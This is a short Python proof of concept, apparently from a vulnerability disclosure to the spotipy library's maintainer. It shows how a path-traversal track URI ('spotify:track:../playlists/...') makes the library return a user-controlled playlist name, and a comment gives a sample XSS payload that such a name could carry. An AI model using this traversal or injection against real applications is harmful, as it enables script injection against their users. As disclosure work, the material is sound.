import spotipy
from spotipy.oauth2 import SpotifyClientCredentials
import os
from dotenv import load_dotenv
load_dotenv()

client_id = os.getenv('SPOTIPY_CLIENT_ID')
client_secret = os.getenv('SPOTIPY_CLIENT_SECRET')

def main():
    spotifyApi = spotipy.Spotify(client_credentials_manager=SpotifyClientCredentials())

    # This URL contains the example playlist ID from the spotify docs, a malicious
    # playlist could instead contain a XSS payload in their title. A playlist with 
    # such a title was also included in the initial report via mail to maintainer.
    malicious_spotify_url = 'spotify:track:../playlists/3cEYpjA9oz9GiPac4AsH4n'
    

    # Usage of the track function, expecting to get a non-user-controllable track name
    # e.g. for displaying in a website.
    # Our modified track uri however makes the library return the name of a playlist which
    # may be created by anyone containing anything.
    track = spotifyApi.track(malicious_spotify_url)

    # Prints:
    # 'Name of the track: Spotify Web API Testing playlist'
    # A malicious playlist could also have an XSS payload as title, which would result in:
    # 'Name of the track: <img src=x onerror=prompt(1)>'
    print(f"Name of the track: {track['name']}")

if __name__ == '__main__':
    main()